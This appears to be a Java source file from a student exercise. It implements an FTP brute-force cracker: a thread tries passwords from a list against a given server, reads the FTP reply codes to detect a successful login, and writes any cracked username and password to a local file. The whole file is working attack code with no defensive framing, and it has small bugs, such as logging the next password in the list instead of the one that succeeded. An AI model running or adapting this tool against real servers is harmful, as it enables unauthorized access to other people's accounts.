/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package creackeador;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.LinkedList;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author alumno
 */
public class HebraCrackeadora extends Thread {

    HebraLectoraCrackeadora hebraLectoraCrackeadora;
    int port;
    Socket canal;
    String ip;
    String usuario;
    int segundos;
    LinkedList<String> contrasenias;
    LinkedList<String> mensajes;
    FileWriter fw;
    BufferedWriter bw;

    public HebraCrackeadora(String usuario, LinkedList<String> contrasenias, String ip, int puerto , int segundos) {
        this.port = puerto;
        this.ip = ip;
        this.segundos = segundos;
        this.usuario = usuario;
        this.contrasenias = contrasenias;
        mensajes = new LinkedList<>();
        try {
            fw = new FileWriter("/home/dam2/Escritorio/raulgmPGV/Creackeador/src/creackeador/pares.txt", true);
            bw = new BufferedWriter(fw);
        } catch (IOException ex) {
        }
    }

    @Override
    public void run() {
        boolean intentoAcertado = false;
        int i = 0;
        while (i < contrasenias.size() && !intentoAcertado) {
            try {
                Thread.sleep(segundos);
                this.canal = new Socket(ip, port);
                PrintWriter salida = new PrintWriter(canal.getOutputStream());
                hebraLectoraCrackeadora = new HebraLectoraCrackeadora(mensajes, canal);
                hebraLectoraCrackeadora.start();
                Thread.sleep(100);

                /*while (mensajes.size() > 0) {
                    String txt = mensajes.pop();
                    if (txt.contains("230")) {
                        bw.write("Usuario: " + usuario + " Contrasenia: " + contra);
                        bw.newLine();
                        intentoAcertado = true;
                    }
                    System.out.println(txt);
                }*/
                while (mensajes.size() > 0) {
                    mensajes.pop();
                }
                //String txt = mensajes.pop();
                if (mensajes.size() <= 0) {
                    salida.println("user " + usuario);
                    salida.flush();

                    Thread.sleep(5);

                    if (mensajes.pop().contains("331")) {
                        salida.println("pass " + contrasenias.get(i++));
                        salida.flush();

                        Thread.sleep(100);

                    }

                    if (mensajes.size() > 0) {
                        String mensaje = mensajes.pop();
                        if (mensaje.contains("530")) {
                            canal.close();
                        } else if (mensaje.contains("230")) {
                            intentoAcertado = true;
                            bw.write("usuario: " + usuario + " contrasenia: " + contrasenias.get(i));
                            bw.flush();
                        }
                    }
                }
                this.canal.close();

            } catch (IOException ex) {
                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InterruptedException ex) {
                Logger.getLogger(HebraCrackeadora.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }

}
